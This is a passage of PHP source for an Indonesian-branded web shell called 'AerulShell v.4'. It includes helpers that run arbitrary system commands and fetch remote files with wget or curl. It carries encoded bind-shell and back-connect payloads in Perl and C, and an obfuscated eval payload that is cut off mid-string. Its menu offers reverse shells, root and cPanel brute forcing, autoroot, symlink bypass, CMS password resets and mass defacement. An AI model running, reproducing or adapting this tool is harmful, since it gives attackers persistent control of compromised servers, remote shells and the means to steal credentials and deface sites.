}
function exe($cmd)
{
if(function_exists('system'))
{
@ob_start();
@system($cmd);
$buff = @ob_get_contents();
@ob_end_clean();
return $buff;
}
elseif(function_exists('exec'))
{
@exec($cmd,$results);
$buff = "";
foreach($results as $result)
{ $buff .= $result; }
return $buff;
}
elseif(function_exists('passthru'))
{
@ob_start();
@passthru($cmd);
$buff = @ob_get_contents();
@ob_end_clean();
return $buff;
}
elseif(function_exists('shell_exec'))
{
$buff = @shell_exec($cmd);
return $buff;
}
}
function tulis($file,$text)
{
$textz = gzinflate(base64_decode($text));
if($filez = @fopen($file,"w"))
{
@fputs($filez,$textz);
@fclose($file);
}
}
function ambil($link,$file)
{
if($fp = @fopen($link,"r"))
{
while(!feof($fp))
{
$cont.= @fread($fp,1024);
}
@fclose($fp);
$fp2 = @fopen($file,"w");
@fwrite($fp2,$cont);
@fclose($fp2);
}
}
function which($pr)
{
$path = exe("which $pr");
if(!empty($path))
{ return trim($path); }
else { return trim($pr); }
}
function download($cmd,$url)
{
$namafile = basename($url);
switch($cmd)
{
case 'wwget': exe(which('wget')." ".$url." -O ".$namafile); break;
case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile); break;
case 'wfread' : ambil($wurl,$namafile);break;
case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
default: break; }
return $namafile;
}
function get_perms($file)
{
if($mode=@fileperms($file))
{
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}
else return "??????????";
}
function clearspace($text){ return str_replace(" ","_",$text); }
$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw=="; $back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
?>
<html>
<head>
<link rel="shortcut icon" href="http://i1121.photobucket.com/albums/l513/iqbalkanci/indonesia-icon-1-1.png" type="image/x-icon" />
<title><?php print TITLE; ?> <?php echo VERSION; ?></title>
<script type='text/javascript'>
var message = new Array() // leave this as is
message[0] = "-=[AerulShell v.4]=-";
var reps = 2
var speed = 70
var p=message.length;
var T="";
var C=0;
var mC=0;
var s=0;
var sT=null;
if(reps<1)reps=1;
function doTheThing(){
T=message[mC];
A();}
function A(){
s++
if(s>9){s=1}
if(s==1){document.title='[D====] '+T+' [====I]'}
if(s==2){document.title='[=E===] '+T+' [===N=]'}
if(s==3){document.title='[==F==] '+T+' [==D==]'}
if(s==4){document.title='[===A=] '+T+' [=O===]'}
if(s==5){document.title='[====>] '+T+' [N====]'}
if(s==6){document.title='[===C=] '+T+' [=E===]'}
if(s==7){document.title='[==E==] '+T+' [==S==]'}
if(s==8){document.title='[=R===] '+T+' [===I=]'}
if(s==9){document.title='[==-==] '+T+' [====A]'}
if(C<(8*reps)){
sT=setTimeout("A()",speed);
C++
}else{
C=0;
s=0;
mC++
if(mC>p-1)mC=0;
sT=null;
doTheThing();}}
doTheThing();
</script>
<script type="text/javascript">
function tukar(lama,baru)
{
document.getElementById(lama).style.display = 'none';
document.getElementById(baru).style.display = 'block';
}
</script>
<style type="text/css">
		AKUSTYLE{ display:none; }
		body{ background-color:transparan;background:#000;background-image: url("http://i24.photobucket.com/albums/c42/revoconsole/adwh_zps8685aa9b.png");background-position: center;    background-attachment: fixed;background-repeat: no-repeat; }
		A:link                  {COLOR: #00FF15; TEXT-DECORATION: none }
		A:visited {COLOR: #00FF15; TEXT-DECORATION: none }
		A:hover {text-shadow: 0pt 0pt 0.0em cyan, 0pt 0pt 0.0em cyan; color: #ffea00; TEXT-DECORATION: none }
		A:active {color: Red; TEXT-DECORATION: none }
		textarea {BORDER-RIGHT:  #3e3e3e 1px solid; BORDER-TOP:    #3e3e3e 1px solid; BORDER-LEFT:   #3e3e3e 1px solid; BORDER-BOTTOM: #3e3e3e 1px solid; BACKGROUND-COLOR: #1b1b1b; font: Fixedsys bold; color: #00FF1E; }
		*{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; }
		#menu{ background:#111111; margin:2px 2px 2px 2px; }
		#menu a{ padding:4px 15px; margin:0; background:#4B2323; text-decoration:none; letter-spacing:2px; -moz-border-radius: 5px; -webkit-border-radius: 15px; -khtml-border-radius: 15px; border-radius: 7px; }
		#menu a:hover{ background:#4F7456; border-bottom:1px solid #333333; border-top:1px solid #333333; }
		.tabnet{ margin:15px auto 0 auto; border: 1px solid #333333; }
		.main { width:100%; }
		.gaya { color: #FF0000; }
		.your_ip { color: #FF4719; }
		.inputz{ background:#000; border:0; padding:2px; border-bottom:1px solid #222222; border-top:1px solid #222222; }
		.inputzbut{ background:#111111; color:#666666; margin:0 4px; border:1px solid #444444; }
		.inputz:hover,
		.inputzbut:hover{ border-bottom:1px solid #4532F6; border-top:1px solid #D4CECE; color:#D4CECE; }
		.output { margin:auto; border:1px solid #FF0000; width:100%; height:400px; background:#000000; padding:0 2px; }
		.cmdbox{ width:100%; }
		.head_info{ padding: 0 4px; }
		.b1{ font-size:30px; padding:0; color:#FF0000; }
		.b2{ font-size:30px; padding:0; color: #FF9966; }
		.b_tbl{ text-align:center; margin:0 4px 0 0; padding:0 4px 0 0; border-right:1px solid #333333; }
		.phpinfo table{ width:100%; padding:0 0 0 0; }
		.phpinfo td{ background:#111111; color:#cccccc; padding:6px 8px;; }
		.phpinfo th, th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; }
		.phpinfo h2,
		.phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; }
		.explore{ width:100%; }
		.explore a { text-decoration:none; }
		.explore td{ border-bottom:1px solid #333333; padding:0 8px; line-height:24px; }
		.explore th{ padding:3px 8px; font-weight:normal; }
		.explore th:hover,
		.phpinfo th:hover{ border-bottom:1px solid #FF0000; }
		.explore tr:hover{ background:#744F4F; }
		.viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; }
		.sembunyi{ display:none; padding:0;margin:0; }
</style>
</head>
<body onLoad="document.getElementById('cmd').focus();">
<div class="main">
<!-- head info start here -->
<div class="head_info">
<table>
<tr>
<td>
<table class="b_tbl">
<tr>
<td>
<a href="?"><span class="b1"><img src="http://i24.photobucket.com/albums/c42/revoconsole/v4_zps788bcd2e.png" width="319" height="119" border="0"></span></a></td>
</tr>
<tr>
<td>Powered by <?php echo $ver; ?></td>
</tr>
</table>
</td>
<td>
<?php echo $buff; ?>
</td>
</tr>
</table>
</div>
<!-- head info end here -->
<!-- menu start -->
<div id="menu">
<center>
<a href="?<?php echo "y=".$pwd; ?>"><b>					Home</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">		<b>Shell</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">			<b>Eval</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">		<b>PHP info</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=interface">	<b>Mysql Manager</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql">		<b>MySQL</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">		<b>Upload</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=backconnect">	<b>Backconnect</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">			<b>Mail</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=port-scanner">	<b>PortScan</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=readable">		<b>Lompat</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=domain">		<b>Domain</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">      <b>Symlink</b></a><br><br>

<a href="?<?php echo "y=".$pwd; ?>&amp;x=cgishell">     <b>CGI-Shell</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cgi2012">      <b>CGI-Telnet2012</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=python">       <b>Python</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bypassconfig"> <b>BypassConfig</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=configsh3ll">  <b>ConfigSh3ll</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=wp">        	<b>Wordpress Reset</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=joomla">       <b>Joomla Reset</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">        	<b>VBulettin</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=litespeed">    <b>Litespeed</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone-h">       <b>Zone-H</b></a><br><br>

<a href="?<?php echo "y=".$pwd; ?>&amp;x=safemode"> 		<b>Safe Mode</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=encrypt">       	<b>MD5 Encrypt</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=MD5">       		<b>MD5 Decrypt</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bdscan">        <b>Backdoor Scanner</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=whmkill">     	<b>WHMCS Killer</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcsdec">        <b>WHMCS Decoder</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=rootbrute">      <b>Root BruteForce</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=autoroot">        <b>Autoroot</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=fans">     		<b>HKC on FB</b></a><br><br>

<a href="?<?php echo "y=".$pwd; ?>&amp;x=cpbrute">     		<b>Cpanel BruteForce</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=web-info">      	<b>WhoIs</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=cpfind">        		<b>CpanelFinder</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=bingreverse">        	<b>Reverse Ip</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=massdeface">       <b>MassDeface</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=command">        	<b>Command</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=passlist">     <b>Wordlist</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=wso25">			<b>WSO 2.5</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=about">        	<b>About</b></a>
<a href="?<?php echo "y=".$pwd; ?>&amp;x=Cleaner">        	<b>AutoClean</b></a>
<a href="?x=out">											<b>Logout</b></a>
</center>
</div>
<!-- menu end -->
<?php
if(isset($_GET['x']) && ($_GET['x'] == 'out')) { logout(); }
elseif(isset($_GET['x']) && ($_GET['x'] == 'php'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post">
<table class="cmdbox">
<tr>
<td>
<textarea class="output" name="cmd" id="cmd"><? eval(gzinflate(base64_decode('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